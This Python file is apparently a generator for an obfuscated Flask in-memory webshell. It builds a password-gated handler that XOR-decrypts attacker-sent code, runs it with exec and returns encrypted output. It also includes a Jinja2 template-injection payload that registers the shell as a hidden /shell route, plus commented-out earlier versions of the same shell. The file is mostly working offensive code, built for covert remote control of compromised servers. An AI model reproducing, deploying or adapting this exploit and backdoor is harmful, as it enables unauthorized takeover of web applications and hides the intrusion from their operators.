from Common.RandXor import RandXor
import base64

shell_tmplate = """
def shell_func():
    import base64
    import random
    parma = {'resp': 'Error', 'app': app, 'gl': ulg}
    if '%magic_str%' in request.get_data(as_text=True):
        p_code = request.get_data(as_text=True).replace('%magic_str%', '')
        ciphertext = base64.b64decode(p_code)
        plaintext = bytearray(len(ciphertext))
        rkey = %rkey%
        key = base64.b64decode('%key%')
        random.seed(rkey)
        for i in range(len(ciphertext)):
            plaintext[i] = ciphertext[i] ^ (random.randint(1, len(ciphertext)) & 0xff) ^ key[i % len(key)]
            plaintext[i] = plaintext[i] ^ rkey
        exec(plaintext, parma)
        plaintext = str(parma['resp']).encode('utf-8')
        ciphertext = bytearray(len(plaintext))
        random.seed(rkey)
        for i in range(len(plaintext)):
            ciphertext[i] = plaintext[i] ^ rkey
            ciphertext[i] = ciphertext[i] ^ (random.randint(1, len(plaintext)) & 0xff) ^ key[i % len(key)]
        parma['resp'] = base64.b64encode(ciphertext).decode('utf-8')
        return str(parma['resp'])
    return parma['resp']
"""
password = 'pass'


rx = RandXor(password)
shell = shell_tmplate.replace('%key%', base64.b64encode(rx.key).decode('utf-8')).replace('%rkey%', str(rx.rkey)).replace('%magic_str%', rx.magic_str)
print(shell)
print(base64.b64encode(shell.encode('utf-8')).decode('utf-8'))
"""
{{ url_for.__globals__['__builtins__']['exec'](
"
exec(__import__('base64').b64decode('{shell}'))
app.view_functions['shell'] = shell_func;
app._got_first_request=False;
app.add_url_rule('/shell', 'shell', shell_func, methods=['POST','GET']);
app._got_first_request=True;
", 
{'request':url_for.__globals__['request'],'ulg': url_for.__globals__, 'app':url_for.__globals__['current_app']})}}
"""
# # -*- coding: utf-8 -*-
# """
# @Time ： 2024-06-13 12:22
# @Auth ： No2Cat
# @File ：generate_shell.py
# @IDE ：PyCharm
# @DESC：
# """
# import hashlib
# import base64
#
# def generate_key(password):
#     return hashlib.sha256(password.encode()).digest()
#
# shell = """
# def my_func():
#     import base64
#     import random
#     parma = {'resp': 'Error'}
#     if '%%magic_str%%' in request.get_data(as_text=True):
#         p_code = request.get_data(as_text=True).replace('%%magic_str%%', '')
#         ciphertext = base64.b64decode(p_code)
#         plaintext = bytearray(len(ciphertext))
#         rkey = %%shell_password_len%%
#         key = base64.b64decode('%%shell_password_md5_8_24%%')
#         random.seed(rkey)
#         for i in range(len(plaintext)):
#             plaintext[i] = plaintext[i] ^ key[i % len(key)]
#         for i in range(len(ciphertext)):
#             plaintext[i] = ciphertext[i] ^ (random.randint(1, len(ciphertext)) & 0xff)
#             plaintext[i] = plaintext[i] ^ rkey
#         exec(plaintext, parma)
#     return parma['resp']
# """
#
# shell = """
# def my_func():
#     import base64
#     import random
#     parma = {'resp': 'Error'}
#     if '%%magic_str%%' in request.get_data(as_text=True):
#         p_code = request.get_data(as_text=True).replace('%%magic_str%%', '')
#         ciphertext = base64.b64decode(p_code)
#         plaintext = bytearray(len(ciphertext))
#         rkey = %%shell_password_len%%
#         key = base64.b64decode('%%shell_password_md5_8_24%%')
#         random.seed(rkey)
#         for i in range(len(plaintext)):
#             plaintext[i] = plaintext[i] ^ key[i % len(key)]
#         for i in range(len(ciphertext)):
#             plaintext[i] = ciphertext[i] ^ (random.randint(1, len(ciphertext)) & 0xff)
#             plaintext[i] = plaintext[i] ^ rkey
#         exec(plaintext, parma)
#         plaintext = parma['resp'].encode('utf-8')
#         ciphertext = bytearray()
#         for i in range(len(plaintext)):
#             ciphertext.append(plaintext[i] ^ key[i % len(key)])
#         for i in range(len(plaintext)):
#             ciphertext[i] = plaintext[i] ^ rkey
#             ciphertext[i] = ciphertext[i] ^ (random.randint(1, len(plaintext)) & 0xff)
#         parma['resp'] = base64.b64encode(ciphertext).decode('utf-8')
#     return parma['resp']
# """
#
# # shell = """
# # def my_func():
# #     import base64
# #     import random
# #     p = {'resp': None}
# #     if '%%magic_str%%' in request.get_data(as_text=True):
# #         p_ = request.get_data(as_text=True).replace('%%magic_str%%', '')
# #         ct = base64.b64decode(p_)
# #         pt = bytearray(len(ct))
# #         rkey = %%shell_password_len%%
# #         key = base64.b64decode('%%shell_password_md5_8_24%%')
# #         random.seed(rkey)
# #         for i in range(len(pt)):
# #             pt[i] = pt[i] ^ key[i % len(key)]
# #         for i in range(len(ct)):
# #             pt[i] = ct[i] ^ (random.randint(1, len(ct)) & 0xff)
# #             pt[i] = pt[i] ^ rkey
# #         exec(pt, p)
# #     return p['resp']
# # """
#
# shell_password = 'pass' # shell密码
# salt_str = 'mewoshell'
#
# md5 = hashlib.md5()
# md5.update(shell_password.encode('utf-8'))
# key = generate_key(md5.hexdigest()[8:24])
# print("shell_password md5:", md5.hexdigest()[8:24])
# print("shell_password_len:", len(shell_password))
# print("shell key = ", base64.b64encode(key).decode('utf-8'))
# # 替换异或 key
# shell = shell.replace('%%shell_password_md5_8_24%%', str(base64.b64encode(key).decode('utf-8'))).replace('%%shell_password_len%%', str(len(shell_password)))
# # 提花 magic_str
# md5.update(str(shell_password+salt_str).encode('utf-8'))
# print("magic_str:", md5.hexdigest()[9:25])
# shell = shell.replace('%%magic_str%%', md5.hexdigest()[9:25])
#
# print(shell)
# print(base64.b64encode(shell.encode('utf-8')).decode('utf-8'))